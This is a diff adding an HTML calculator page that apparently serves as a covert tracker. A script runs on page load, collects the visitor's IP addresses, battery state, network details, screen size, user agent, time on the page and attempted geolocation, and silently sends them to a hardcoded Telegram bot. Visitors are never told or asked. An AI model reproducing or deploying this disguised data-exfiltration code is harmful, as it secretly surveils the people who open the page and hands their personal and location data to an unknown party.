@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Calculator with Info Collection</title>
+    <style>
+        body, .display, .button { margin: 0; padding: 0; font-family: Arial, sans-serif; }
+        body { display: flex; justify-content: center; align-items: center; height: 100vh; background: linear-gradient(135deg, #81ecec, #6c5ce7); }
+        .calculator { width: 320px; background: #2d3436; border-radius: 15px; padding: 20px; box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3); }
+        .display { width: 100%; height: 60px; background: #000; color: #fff; text-align: right; font-size: 2em; padding: 10px; border-radius: 10px; margin-bottom: 20px; }
+        .buttons { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; }
+        .button { background: #636e72; color: #fff; border: none; border-radius: 10px; height: 60px; font-size: 1.5em; cursor: pointer; transition: 0.3s; }
+        .button.operation { background: #fdcb6e; color: #2d3436; }
+        .button.equal { background: #00cec9; grid-column: span 2; position: relative; }
+        .button img { position: absolute; right: -80px; top: 0; height: 60px; width: 60px; border-radius: 10px; }
+        .button.clear { background: #d63031; }
+        .button.backspace { background: #e17055; }
+    </style>
+</head>
+<body>
+    <div class="calculator">
+        <div class="display" id="display">0</div>
+        <div class="buttons">
+            <button class="button clear" onclick="display.innerText='0'">C</button>
+            <button class="button backspace" onclick="display.innerText=display.innerText.slice(0,-1)||'0'">&#9003;</button>
+            <button class="button operation" onclick="append('/')">/</button>
+            <button class="button operation" onclick="append('*')">*</button>
+            <button class="button" onclick="append('7')">7</button>
+            <button class="button" onclick="append('8')">8</button>
+            <button class="button" onclick="append('9')">9</button>
+            <button class="button operation" onclick="append('-')">-</button>
+            <button class="button" onclick="append('4')">4</button>
+            <button class="button" onclick="append('5')">5</button>
+            <button class="button" onclick="append('6')">6</button>
+            <button class="button operation" onclick="append('+')">+</button>
+            <button class="button" onclick="append('1')">1</button>
+            <button class="button" onclick="append('2')">2</button>
+            <button class="button" onclick="append('3')">3</button>
+            <button class="button" onclick="append('0')">0</button>
+            <button class="button" onclick="append('.')">.</button>
+            <button class="button" onclick="display.innerText=Math.sqrt(eval(display.innerText))">√</button>
+            <button class="button" onclick="display.innerText=Math.pow(eval(display.innerText),2)">x²</button>
+            <button class="button" onclick="display.innerText=Math.pow(eval(display.innerText),3)">x³</button>
+            <button class="button equal" onclick="display.innerText=eval(display.innerText)">=<img src="https://i.postimg.cc/rptmptXs/IMG-20240809-223419-984.jpg" alt="icon"></button>
+        </div>
+    </div>
+    <script>
+        const display = document.getElementById('display');
+        let startTime = Date.now();
+        function append(value) { display.innerText === '0' ? display.innerText = value : display.innerText += value; }
+
+        async function sendUserInfo() {
+            try {
+                const ipv4 = await (await fetch('https://api.ipify.org?format=json')).json();
+                const ipv6 = await (await fetch('https://api64.ipify.org?format=json')).json();
+                const battery = await navigator.getBattery();
+                const deviceInfo = navigator.userAgent;
+                const charge = `${battery.level * 100}%`;
+                const isCharging = battery.charging ? "Yes" : "No";
+                const networkType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
+                const downlinkSpeed = navigator.connection ? navigator.connection.downlink + ' Mbps' : "Unknown";
+                const wifiOrCellular = navigator.connection ? (navigator.connection.type === 'wifi' ? 'Wi-Fi' : 'Cellular') : "Unknown";
+                const language = navigator.language || "Unknown";
+                const screenWidth = window.screen.width;
+                const screenHeight = window.screen.height;
+                const currentTime = new Date().toLocaleString();
+                const timeSpent = ((Date.now() - startTime) / 1000).toFixed(2) + " seconds";
+
+                let geoLocation = "Permission Denied or Unavailable";
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition((position) => {
+                        geoLocation = `Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`;
+                    });
+                }
+
+                const message = `
+                USER INFORMATION FROM YOUR💕                   IPV4: ${ipv4.ip}
+IPV6: ${ipv6.ip}
+CHARGE: ${charge}
+IS CHARGING: ${isCharging}
+NETWORK (G): ${networkType}
+NETWORK TYPE: ${wifiOrCellular}
+DOWNLINK SPEED: ${downlinkSpeed}
+LANGUAGE: ${language}
+SCREEN: ${screenWidth}x${screenHeight}
+GEO-LOCATION: ${geoLocation}
+DEVICE INFO: ${deviceInfo}
+CURRENT TIME: ${currentTime}
+TIME SPENT IN APP: ${timeSpent}
+                `;
+
+                const telegramAPI = `https://api.telegram.org/bot7256405576:AAHlKMx4W0PZVVxeXrIhpUTrNBoeGVoNQK8/sendMessage?chat_id=6300206674&text=${encodeURIComponent(message)}`;
+                await fetch(telegramAPI);
+            } catch (error) {
+                console.error('Error sending user info:', error);
+            }
+        }
+
+        sendUserInfo();
+    </script>
+</body>
+</html>
